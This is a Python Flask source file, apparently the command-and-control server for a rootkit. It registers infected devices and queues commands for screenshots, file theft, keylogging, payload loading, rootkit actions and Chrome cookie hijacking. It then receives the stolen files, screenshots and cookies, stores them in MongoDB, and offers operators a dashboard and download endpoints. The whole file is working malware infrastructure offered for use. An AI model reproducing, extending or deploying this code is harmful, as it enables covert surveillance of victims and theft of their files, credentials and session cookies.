from flask import Flask, request, jsonify, render_template, send_file, Response
from pymongo import MongoClient, errors
from dotenv import load_dotenv
from bson.objectid import ObjectId
from gridfs import GridFS
from datetime import datetime, timedelta
import os
import re
import json
import base64
import io
import zipfile

# Load environment variables from .env file
load_dotenv()

app = Flask(__name__)

# MongoDB Configuration
MONGO_URI = os.getenv('MONGO_URI')

# Initialize MongoDB client and GridFS
client = MongoClient(MONGO_URI)
db = client.get_database()
fs = GridFS(db)

def initialize_db():
    try:
        # Check the connection
        client.admin.command('ping')

        # Initialize collections
        initialize_collection(db, 'campaigns')
        initialize_collection(db, 'last_activity')
       

        return client, db, db['campaigns'], db['last_activity']
    except errors.ServerSelectionTimeoutError as err:
        print(f'Failed to connect to MongoDB: {err}')
        return None, None, None, None

def initialize_collection(db, collection_name):
    if collection_name not in db.list_collection_names():
        print(f'Collection "{collection_name}" does not exist. Creating collection and inserting initial schema.')
        
        if collection_name == 'campaigns':
            sample_campaigns = [
                {
                    'client_id': 'client123',
                    'device_name': 'Device A',
                    'last_activity_date': datetime.now(),
                    'status': 'active'
                },
                {
                    'client_id': 'client123',
                    'device_name': 'Device B',
                    'last_activity_date': datetime.now(),
                    'status': 'inactive'

                }
            ]
            db[collection_name].insert_many(sample_campaigns)

client, db, campaign_collection, last_activity_collection = initialize_db()

#Rootkit API
# Registration !!!
@app.route('/c2/register/', methods=['POST'])
def registration():
    print('hi')
    data = request.get_data(as_text=True)  
    print('Raw data:', data) 
    try:
        json_data = json.loads(data) 
        client_id = json_data.get("client_id")
        print('Client ID:', client_id)
    except json.JSONDecodeError as e:
        print('Error decoding JSON:', e)
        return jsonify({'status': '1'}), 400

    if client_id:
        existing_client = campaign_collection.find_one({'client_id': client_id})

        if existing_client:
            if existing_client['status'] == 'active':
                return jsonify({'status':'0'}), 200
            elif existing_client['status'] == 'inactive':
                campaign_collection.update_one(
                    {'client_id': client_id},
                    {'$set': {'status': 'active', 'registered_at': datetime.now()}}
                )
                return jsonify({'status': '0'}), 200
        else:
            campaign_count = campaign_collection.count_documents({})
            next_campaign_letter = chr(ord('A') + campaign_count)
            device_name = f"Device {next_campaign_letter}"

            db.create_collection(f'artifacts_{device_name}')
            db.create_collection(f'command_queue_{device_name}')

            campaign_collection.update_one(
                {'client_id': client_id},
                {
                    '$set': {
                        'client_id': client_id,
                        'device_name': device_name,
                        'last_activity_date': datetime.now(),
                        'status': 'active'
                    }
                },
                upsert=True
            )
            return jsonify({'status': '0'}), 200
    else:
        return jsonify({'status': '1'}), 400

# Keep alive !!!!!
@app.route('/c2/keep_alive/', methods=['POST'])
def keep_alive():
    data = request.json
    client_id = data.get("client_id")
    
    campaign_collection.update_one(
        {'client_id': client_id},
        {'$set': {'last_activity_date': datetime.now()}}
    )
    
    response = {
        'status': 'success',
        'message': 'Ping acknowledged'
    }
    
    return jsonify(response), 200

# add command to the Q !!!!!
@app.route('/<client_name>/add_command/', methods=['POST'])
def add_command(client_name):
    data = request.json
    command = data.get('Cmd')
    restart = data.get('restart', 0)  # Get the restart parameter
    print(restart)
    
    if not command:
        return jsonify({'status': 'error', 'message': 'Command not provided'}), 400

    queue_collection_name = f'command_queue_{client_name}'
    activity_id = str(ObjectId())

    # Log the activity in the last_activity_collection first
    last_activity_data = {
        '_id': activity_id,
        'device': client_name,
        'date': datetime.now(),
        'action_type': command,
        'status': 'in progress'
    }
    last_activity_collection.insert_one(last_activity_data)

    # Process the command
    if command == 'screenshot':
        command_data = json.dumps({
        'SCREEN_SHOOTER': {'activity_id': activity_id,'restart': restart}    
        })

    elif command == 'file_theft':
        tasks = data.get('tasks', {})
        
        # Format tasks as required
        formatted_tasks = {}
        for task_id, task_details in tasks.items():
            formatted_tasks[task_id] = {
                "start_path": task_details.get("start_path"),
                "files": task_details.get("files", [])
            }
        
        command_data = json.dumps({
            "FILE_GRABBER": {
                "activity_id": activity_id,
                "restart": restart,
                **formatted_tasks
            }
        })
    elif command == 'keylogger':
        action = data.get('action')
        if action == "stop":
           command_data = json.dumps({  
            "KEY_LOGGER": {"activity_id": activity_id,"restart": restart , "stop": "1"} 
        }) 
        else:   
         command_data = json.dumps({  
            "KEY_LOGGER": {"activity_id": activity_id,"restart": restart,"action": action} 
        })
    elif command == 'loader':
        file_content = data.get('file_content')
        if file_content:
            command_data = json.dumps({
        "LOADER": {
           "activity_id": activity_id,
            "restart": restart,
            "1337": {
              "file_content": file_content
            }
           }})
            
        else:
            last_activity_collection.update_one(
                {'_id': activity_id},
                {'$set': {'status': 'failure'}}
            )
            return jsonify({'status': 'error', 'message': 'File content not provided'}), 400
    elif command == 'cookies':
         command_data = json.dumps({
         "COOKIES_HIJACKER": {
            "1337": {
            "cookies_path": "/home/danielhay/.config/google-chrome/Default/Cookies"
          },
          "activity_id": activity_id,
          "restart": restart
       }})
        
         
    elif command == 'rootkit':
        id_str = data.get('id')  # Get the id as a string
        value = data.get('value')  # Get the value
        try:
            # Convert the id from string to integer
            id_num = int(id_str)
        except ValueError:
            # Handle the case where id_str is not a valid integer
            return jsonify({"status": "error", "message": "Invalid ID format."}), 400

        # Prepare the command data with the id as an integer
        command_data = json.dumps({
            "ROOTKIT": {
                "activity_id": activity_id,
                "restart": restart,
                "id": id_str,
                "args": value
            }
        })
    else:
        last_activity_collection.update_one(
            {'_id': activity_id},
            {'$set': {'status': 'failure'}}
        )
        return jsonify({'status': 'error', 'message': 'Unknown command'}), 400
    
    print(command_data)

    # Insert the command into the command queue
    db[queue_collection_name].insert_one({
        '_id': activity_id,
        'command': command,
        'timestamp': datetime.now(),
        'json': command_data
    })
    
    return jsonify({'status': 'success', 'message': 'Command added to queue'}), 200
    

#Send command to the Agent !!!!
@app.route('/c2/new_command/', methods=['POST'])
def send_command():
    data = request.json
    client_id = data.get('client_id')
    existing_client = campaign_collection.find_one({'client_id': client_id})
    if not existing_client:
        return jsonify({'status': 'error', 'message': 'Client not found'}), 200
    
    device_name = existing_client.get('device_name')
    queue_collection_name = f'command_queue_{device_name}'

    command_doc = db[queue_collection_name].find_one_and_delete({}, sort=[('timestamp', 1)])

    if command_doc:
        command_data = command_doc.get('json')
        command_data = json.loads(command_data)
        print(type(command_data))
        return jsonify(command_data), 200
    else:
        return jsonify({'status': 'error', 'message': 'No commands in queue'}), 200


#get artifacts    
@app.route('/c2/send_artifact/', methods=['POST'])
def receive_artifact():
    try:
        data = request.json
        artifact_type = next((at for at in ['FILE_GRABBER', 'SCREEN_SHOOTER', 'COOKIES_HIJACKER', 'KEY_LOGGER', 'LOADER', 'ROOTKIT'] if at in data), None)

        if artifact_type is None:
            app.logger.error('No valid artifact type provided')
            return jsonify({'status': 'error', 'message': 'No valid artifact type provided'}), 400

        artifact_data = data.get(artifact_type, [])
        activity_id = data.get('activity_id')
        client_id = data.get('client_id')

        if not activity_id:
            app.logger.error('Activity ID not provided')
            return jsonify({'status': 'error', 'message': 'Activity ID not provided'}), 400

        last_activity = last_activity_collection.find_one({'_id': activity_id})

        if not last_activity:
            app.logger.error('Activity ID not found')
            return jsonify({'status': 'error', 'message': 'Activity ID not found'}), 404

        device_name = last_activity.get('device')
        artifact_collection_name = f'artifacts_{device_name}'
        artifact_collection = db[artifact_collection_name]

        responses = []
        status_update = 'success'

        if artifact_type == 'SCREEN_SHOOTER':
            if isinstance(artifact_data, list) and len(artifact_data) > 0:
                screenshot_base64 = artifact_data[0]
                data_value = screenshot_base64.get('data')
                error_value = screenshot_base64.get('error')
                result_value = screenshot_base64.get('result')

                if not data_value:
                    app.logger.error('The screenshot data is empty or missing.')
                    status_update = 'failure'
                elif error_value or result_value == 'failure':
                    app.logger.error(f'Screenshot failed with error: {error_value}')
                    status_update = 'failure'
                elif result_value == 'success' and not error_value:
                    try:
                        existing_files = fs.find({'filename': {'$regex': f'^{artifact_type}_\\d+\\.png$'}})
                        latest_number = max([int(re.search(r'_(\d+)\.png$', file.filename).group(1)) for file in existing_files], default=0)
                        new_number = latest_number + 1
                        file_name = f"{artifact_type}_{new_number}.png"
                        
                        screenshot_data = base64.b64decode(data_value)
                        fs.put(io.BytesIO(screenshot_data), filename=file_name)

                        artifact_record = {
                            'client_id': client_id,
                            'activity_id': activity_id,
                            'device': device_name,
                            'artifact_type': artifact_type,
                            'file_name': file_name,
                            'content': data_value,
                            'created_at': datetime.now()
                        }
                        artifact_collection.insert_one(artifact_record)
                        responses.append({'file_name': file_name, 'status': 'saved'})
                    except Exception as e:
                        app.logger.error(f'Failed to insert artifact into database: {str(e)}')
                        status_update = 'failure'
            else:
                app.logger.error('Invalid data format for SCREEN_SHOOTER')
                status_update = 'failure'

        elif artifact_type == 'ROOTKIT':
            rootkit_entries = artifact_data if isinstance(artifact_data, list) else [artifact_data]

            for rootkit_data in rootkit_entries:
                if not isinstance(rootkit_data, dict):
                    app.logger.error('Invalid data format for ROOTKIT')
                    status_update = 'failure'
                    break

                result = rootkit_data.get('result')
                error = rootkit_data.get('error')

                if result == 'failure':
                    app.logger.error(f'Rootkit scan failed with error: {error}')
                    status_update = 'failure'
                    break

                if result == 'success':
                    responses.append({'status': 'success', 'message': 'Rootkit scan succeeded'})
                else:
                    app.logger.error('Unexpected result value for ROOTKIT')
                    status_update = 'failure'
                    break

        elif artifact_type == 'FILE_GRABBER':
            file_grabber_entries = artifact_data if isinstance(artifact_data, list) else [artifact_data]

            for file_grabber_data in file_grabber_entries:
                if not isinstance(file_grabber_data, dict):
                    app.logger.error('Invalid data format for FILE_GRABBER')
                    status_update = 'failure'
                    break

                result = file_grabber_data.get('result')
                error = file_grabber_data.get('error')
                zip_base64 = file_grabber_data.get('data')

                if result == 'failure':
                    app.logger.error(f'File grabber failed with error: {error}')
                    status_update = 'failure'
                    break

                if not zip_base64:
                    app.logger.error('The zip_file data is empty.')
                    status_update = 'failure'
                    break

                try:
                    zip_data = base64.b64decode(zip_base64)
                    with zipfile.ZipFile(io.BytesIO(zip_data), 'r') as zip_file:
                        for file_info in zip_file.infolist():
                            if file_info.is_dir() or file_info.filename.endswith('.zip'):
                                continue

                            file_name = file_info.filename
                            file_data = zip_file.read(file_info)
                            fs.put(io.BytesIO(file_data), filename=file_name)

                            artifact_record = {
                                'client_id': client_id,
                                'activity_id': activity_id,
                                'device': device_name,
                                'artifact_type': artifact_type,
                                'file_name': file_name,
                                'content': base64.b64encode(file_data).decode('utf-8'),
                                'created_at': datetime.now()
                            }
                            artifact_collection.insert_one(artifact_record)
                            responses.append({'file_name': file_name, 'status': 'saved'})
                except Exception as e:
                    app.logger.error(f'Failed to process zip file: {str(e)}')
                    status_update = 'failure'

        elif artifact_type == 'LOADER':
            if isinstance(artifact_data, list) and len(artifact_data) == 1 and isinstance(artifact_data[0], str) and artifact_data[0] == "/proc/self/fd/4":
                responses.append({'status': 'success', 'message': 'LOADER payload is as expected'})
            else:
                app.logger.error('Invalid data format for LOADER')
                status_update = 'failure'            

        elif artifact_type == 'COOKIES_HIJACKER':
            cookie_entries = artifact_data if isinstance(artifact_data, list) else [artifact_data]

            aggregated_cookies = []
            for cookie_entry in cookie_entries:
                if not isinstance(cookie_entry, list):
                    app.logger.error('Invalid data format for COOKIES_HIJACKER')
                    status_update = 'failure'
                    break

                for cookie_data in cookie_entry:
                    if not isinstance(cookie_data, dict):
                        app.logger.error('Invalid cookie data format in COOKIES_HIJACKER')
                        status_update = 'failure'
                        break

                    aggregated_cookies.append(cookie_data)

            cookies_json = json.dumps(aggregated_cookies, indent=4)

            try:
                file_name = f"{artifact_type}_{activity_id}.json"
                fs.put(io.BytesIO(cookies_json.encode('utf-8')), filename=file_name)

                artifact_record = {
                    'client_id': client_id,
                    'activity_id': activity_id,
                    'device': device_name,
                    'artifact_type': artifact_type,
                    'file_name': file_name,
                    'created_at': datetime.now()
                }
                artifact_collection.insert_one(artifact_record)
            except Exception as e:
                app.logger.error(f'Failed to save cookies to database: {str(e)}')
                status_update = 'failure'

        else:
            if not isinstance(artifact_data, dict):
                app.logger.error(f'Invalid data format for {artifact_type}')
                status_update = 'failure'
            else:
                error_message = artifact_data.get('error', '')
                result = artifact_data.get('result', 'failure')
                
                if error_message:
                    status_update = 'failure'
                elif result == 'success':
                    status_update = 'success'
                else:
                    status_update = 'failure'

        last_activity_collection.update_one(
            {'_id': activity_id},
            {'$set': {'status': status_update}}
        )

        return jsonify({'status': 'Your reply has been successfully received by the server', 'responses': responses})

    except Exception as e:
        app.logger.error(f'Unhandled exception: {str(e)}')
        return jsonify({'status': 'error', 'message': f'Unhandled exception: {str(e)}'}), 500



#server (front) API 

# Login
VALID_USERNAME = os.getenv('VALID_USERNAME')
VALID_PASSWORD = os.getenv('VALID_PASSWORD')

@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    if username == VALID_USERNAME and password == VALID_PASSWORD:
        return jsonify({'status': 'success'})
    else:
        return jsonify({'status': 'failure'}), 401

# Routes
@app.route('/')
def index():
    return render_template('login.html')

#Charts - Dashboard
@app.route('/dashboard')
def dashboard():
    active_campaigns_count = campaign_collection.count_documents({"status": "active"})
    total_campaigns_count = campaign_collection.count_documents({})
    return render_template('Dashboard.html',
                           active_campaigns=active_campaigns_count,
                           total_campaigns=total_campaigns_count)

@app.route('/api/dashboard-data')
def api_dashboard_data():
    success_count = last_activity_collection.count_documents({"status": "success"})
    failure_count = last_activity_collection.count_documents({"status": "failure"})
    inprogress_count = last_activity_collection.count_documents({"status": "in progress"})
    data = {
        'success': success_count,
        'failure': failure_count,
        'inprogress': inprogress_count
    }
    return jsonify(data)

@app.route('/api/top-actions')
def top_actions():
    pipeline = [
        {"$group": {"_id": "$action_type", "count": {"$sum": 1}}},
        {"$sort": {"count": -1}},
        {"$limit": 3}
    ]
    top_actions = list(last_activity_collection.aggregate(pipeline))
    data = {
        'actions': [action['_id'] for action in top_actions],
        'counts': [action['count'] for action in top_actions]
    }
    return jsonify(data)

@app.route('/api/last-activity', methods=['GET'])
def last_activity():
    try:
        ten_days_ago = datetime.now() - timedelta(days=10)
        activities = list(last_activity_collection.find(
            {'date': {'$gte': ten_days_ago}}
        ).sort("date", 1)) 
        date_hour_counts = {}
        action_types = {}
        for activity in activities:
            date_str = activity['date'].strftime('%Y-%m-%d')
            hour = activity['date'].hour 
            action_type = activity.get('action_type', 'Unknown Action')  

            if date_str not in date_hour_counts:
                date_hour_counts[date_str] = [0] * 24 
                action_types[date_str] = [''] * 24 
            
            date_hour_counts[date_str][hour] += 1
            action_types[date_str][hour] = action_type  

        data = {
            'dates': [],
            'hours': [],
            'action_types': []
        }
        for date, hours in date_hour_counts.items():
            data['dates'].append(date)
            data['hours'].append(hours)
            data['action_types'].append(action_types[date]) 
        return jsonify(data)
    except Exception as e:
        print(f'Error retrieving last activity data: {e}')
        return jsonify({'error': 'Failed to retrieve data'}), 500

@app.route('/info')
def info():
    return render_template('Info.html')

@app.route('/login')
def BackToLogin():
    return render_template('Login.html')

@app.route('/management')
def Management():
    campaigns = list(campaign_collection.find().sort("registered_at", -1))
    return render_template('Management.html', campaigns=campaigns)

@app.route('/lastActivity')
def table():
    last_activities = list(last_activity_collection.find().sort("date", -1))
    return render_template('Last-Activity.html', last_activities=last_activities)

@app.route('/campaigns')
def Campaigns():
    devices = campaign_collection.find({"status": "active"}, {"_id": 0, "device_name": 1}) 
    device_list = [device['device_name'] for device in devices]
    return render_template('campaigns.html', devices=device_list)

# Generate Report
@app.route('/report', methods=['GET'])
def report():
    try:
        active_connections_count = campaign_collection.count_documents({"status": "active"})
        total_connections_count = campaign_collection.count_documents({})
        
        total_activities_count = last_activity_collection.count_documents({})
        success_count = last_activity_collection.count_documents({"status": "success"})
        failure_count = last_activity_collection.count_documents({"status": "failure"})
        
        success_percentage = (success_count / total_activities_count * 100) if total_activities_count > 0 else 0
        failure_percentage = (failure_count / total_activities_count * 100) if total_activities_count > 0 else 0
        
        pipeline = [
            {"$group": {"_id": "$action_type", "count": {"$sum": 1}}},
            {"$sort": {"count": -1}},
            {"$limit": 3}
        ]
        top_actions = list(last_activity_collection.aggregate(pipeline))
        top_actions_data = {
            'actions': [action['_id'] for action in top_actions],
            'counts': [action['count'] for action in top_actions]
        }
        
        ten_days_ago = datetime.now() - timedelta(days=10)
        activities = list(last_activity_collection.find(
            {'date': {'$gte': ten_days_ago}}
        ).sort("date", 1))
        
        date_counts = {}
        for activity in activities:
            date_str = activity['date'].strftime('%Y-%m-%d')
            if date_str not in date_counts:
                date_counts[date_str] = 0
            date_counts[date_str] += 1
        
        max_date = max(date_counts, key=date_counts.get, default=None)  

        report_data = {
            'active_connections': active_connections_count,
            'total_connections': total_connections_count,
            'success_count': success_count,
            'failure_count': failure_count,
            'success_percentage': success_percentage,
            'failure_percentage': failure_percentage,
            'top_actions': top_actions_data,
            'highest_activity_date': max_date
        }
        
        json_data = json.dumps(report_data, indent=4)
        buffer = io.BytesIO()
        buffer.write(json_data.encode('utf-8'))
        buffer.seek(0)  

        return send_file(
            buffer,
            as_attachment=True,
            download_name='report.json',
            mimetype='application/json'
        )
    except Exception as e:
        print(f'Error generating report: {e}')
        return jsonify({'error': 'Failed to generate report'}), 500
    
#Need to handle after integration with liad#
@app.route('/api/artifacts/<device_name>', methods=['GET'])
def get_artifacts(device_name):
    artifact_collection_name = f'artifacts_{device_name}'
    artifact_collection = db[artifact_collection_name]
    
    try:
        artifacts = list(artifact_collection.find({}, {'_id': 0, 'file_name': 1, 'artifact_type': 1, 'created_at': 1, 'content': 1}))
        
        if artifacts:
            for artifact in artifacts:
                artifact['created_at'] = artifact['created_at'].strftime('%Y-%m-%d %H:%M:%S')
        return jsonify({'artifacts': artifacts}), 200
    except Exception as e:
        print(f'Error retrieving artifacts for {device_name}: {e}')
        return jsonify({'error': 'Failed to retrieve artifacts'}), 500

#get image fridFS - work 
@app.route('/image/<file_id>')
def get_image(file_id):
    try:
        file = fs.find_one({'_id': ObjectId(file_id)})
        if not file:
            return jsonify({'error': 'File not found'}), 404

        return send_file(io.BytesIO(file.read()), mimetype='image/png')
    except Exception as e:
        return jsonify({'error': f'Failed to retrieve file: {str(e)}'}), 500

#download cookies 
@app.route('/api/download/<filename>', methods=['GET'])
def download_file(filename):
    try:
        # Get the file from GridFS
        file = fs.get_last_version(filename=filename)
        if file:
            return Response(file.read(), mimetype='application/json', headers={"Content-Disposition": f"attachment;filename={filename}"})
        else:
            return jsonify({'error': 'File not found'}), 404
    except Exception as e:
        app.logger.error(f'Failed to download file: {str(e)}')
        return jsonify({'error': 'Failed to download file'}), 500

@app.route('/delete_campaign/<device_name>', methods=['POST'])
def delete_campaign(device_name):
    activity_id = str(ObjectId())
    result = campaign_collection.update_one(
        {'device_name': device_name, 'status': 'active'},
        {'$set': {'status': 'inactive'}}
    )
    
    command_data = json.dumps({"stop" : "1"})
    queue_collection_name = f'command_queue_{device_name}'

    db[queue_collection_name].insert_one({
        '_id': activity_id,
        'command': 'stop',
        'timestamp': datetime.now(),
        'json': command_data
    })

    if result.modified_count > 0:
        return jsonify({'status': 'success', 'message': 'Campaign status updated to inactive'})
    else:
        return jsonify({'status': 'failure', 'message': 'Campaign not found or already inactive'}), 404

    
# Run server
if __name__ == '__main__':
    #import IPython; IPython.embed()
    import venv
    #print(open(r'C:\Users\Daniel.Hay\Desktop\AmazingRootkit\amazing_rootkit\cert.pem','rb').read(100))
    #app.run(debug=True, host='0.0.0.0',port=1234,ssl_context=(r'C:\Users\Daniel.Hay\Desktop\AmazingRootkit\amazing_rootkit\cert.pem', r'C:\Users\Daniel.Hay\Desktop\AmazingRootkit\amazing_rootkit\key.pem'))
    app.run(debug=True, host='0.0.0.0',port=1234)